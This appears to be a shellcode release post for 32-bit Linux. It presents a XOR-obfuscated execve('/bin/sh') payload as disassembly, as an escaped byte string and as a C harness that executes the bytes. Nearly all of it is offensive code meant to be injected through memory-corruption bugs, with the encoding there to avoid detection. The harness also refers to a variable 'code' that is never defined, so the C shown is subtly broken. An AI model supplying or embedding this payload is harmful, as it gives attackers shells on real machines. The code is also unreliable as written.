Obfuscated Execve /bin/sh Shellcode


Greetz  : Bomberman&T-Rex
Author  : B3mB4m
Tested On : Ubuntu 14.04 


/* Working on SLAE &  SPSE  <3 */


Disassembly of section .text:

08048060 <.text>:

 8048060:	eb 10                	jmp    0x8048072
 8048062:	5e                   	pop    %esi
 8048063:	31 c9                	xor    %ecx,%ecx
 8048065:	b1 2c                	mov    $0x2c,%cl
 8048067:	80 36 aa             	xorb   $0xaa,(%esi)
 804806a:	80 36 fa             	xorb   $0xfa,(%esi)
 804806d:	46                   	inc    %esi
 804806e:	e2 f7                	loop   0x8048067
 8048070:	eb 05                	jmp    0x8048077
 8048072:	e8 eb ff ff ff       	call   0x8048062
 8048077:	bb 40 0e 61 99       	mov    $0x99610e40,%ebx
 804807c:	e1 45                	loope  0x80480c3
 804807e:	d0 66 fa             	shlb   -0x6(%esi)
 8048081:	d0 66 af             	shlb   -0x51(%esi)
 8048084:	16                   	push   %ss
 8048085:	b2 a7                	mov    $0xa7,%dl
 8048087:	bb 55 b8 bb af       	mov    $0xafbbb855,%ebx
 804808c:	af                   	scas   %es:(%edi),%eax
 804808d:	af                   	scas   %es:(%edi),%eax
 804808e:	34 c5                	xor    $0xc5,%al
 8048090:	55                   	push   %ebp
 8048091:	6d                   	insl   (%dx),%es:(%edi)
 8048092:	2a 2a                	sub    (%edx),%ch
 8048094:	76 6d                	jbe    0x8048103
 8048096:	6d                   	insl   (%dx),%es:(%edi)
 8048097:	2a 67 6c             	sub    0x6c(%edi),%ah
 804809a:	6b 8c e6 8c c7 b5 0e 	imul   $0xffffffc8,0xeb5c78c(%esi,%eiz,8),%ecx 
 80480a1:	c8 
 80480a2:	85                   	.byte 0x85


#include <stdio.h>
#include <string.h>

unsigned char obfucusted[] = \
"\xeb\x10\x5e\x31\xc9\xb1\x2c\x80\x36\xaa\x80\x36\xfa\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xbb\x40\x0e\x61\x99\xe1\x45\xd0\x66\xfa\xd0\x66\xaf\x16\xb2\xa7\xbb\x55\xb8\xbb\xaf\xaf\xaf\x34\xc5\x55\x6d\x2a\x2a\x76\x6d\x6d\x2a\x67\x6c\x6b\x8c\xe6\x8c\xc7\xb5\x0e\xc8\x85";


main(){
	printf("Shellcode Length:  %d\n", strlen(obfucusted));
	int (*ret)() = (int(*)())code;
	ret();}
